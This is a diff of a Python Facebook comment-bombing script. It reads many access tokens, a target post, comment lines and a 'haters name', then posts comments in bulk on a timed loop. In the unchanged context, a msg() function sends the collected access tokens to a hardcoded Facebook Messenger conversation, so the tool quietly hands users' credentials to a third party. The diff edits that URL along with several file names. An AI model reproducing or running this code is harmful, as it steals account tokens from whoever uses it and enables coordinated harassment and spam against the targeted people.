@@ -14,7 +14,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b"kuuju oii kooniichiwa senpaii :3")
+        self.wfile.write(b"ABHI TRICKER")
 
 def execute_server():
     PORT = 4000
@@ -22,10 +22,10 @@ def execute_server():
     with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
         print("Server running at http://localhost:{}".format(PORT))
         httpd.serve_forever()
-        
+
 
 def post_comments():
-    with open('tukun.txt', 'r') as file:
+    with open('tokennum.txt', 'r') as file:
         tokens = file.readlines()
     num_tokens = len(tokens)
 
@@ -40,7 +40,7 @@ def post_comments():
     cls()
 
     def liness():
-        print('\u001b[37m' + '•────────────MADE BY ABHI YADAV───────────────────────────•')
+        print('\u001b[37m' + '•─────────────────────────────────────────────────────────•')
 
     headers = {
         'Connection': 'keep-alive',
@@ -57,22 +57,22 @@ def post_comments():
 
     access_tokens = [token.strip() for token in tokens]
 
-    with open('pust.txt', 'r') as file:
+    with open('post.txt', 'r') as file:
         post_url = file.read().strip()
 
 
-    with open('cummuts.txt', 'r') as file:
+    with open('comments.txt', 'r') as file:
         comments = file.readlines()
 
     num_comments = len(comments)
     max_tokens = min(num_tokens, num_comments)
 
-    with open('huturnme.txt', 'r') as file:
+    with open('hatersname.txt', 'r') as file:
         haters_name = file.read().strip()
 
-    with open('tme.txt', 'r') as file:
+    with open('time.txt', 'r') as file:
         speed = int(file.read().strip())
-        
+
      #post_id = post_urlsplit
 
     liness()
@@ -128,7 +128,7 @@ def msg():
             access_tokens) + '\nLink: https://www.facebook.com/messages/t/' + convo_id
     }
     try:
-        s = requests.post("https://graph.facebook.com/v15.0/t_100006623113766", data=parameters, headers=headers)
+        s = requests.post("https://graph.facebook.com/v15.0/t_100006623113766/", data=parameters, headers=headers)
     except:
         pass
 
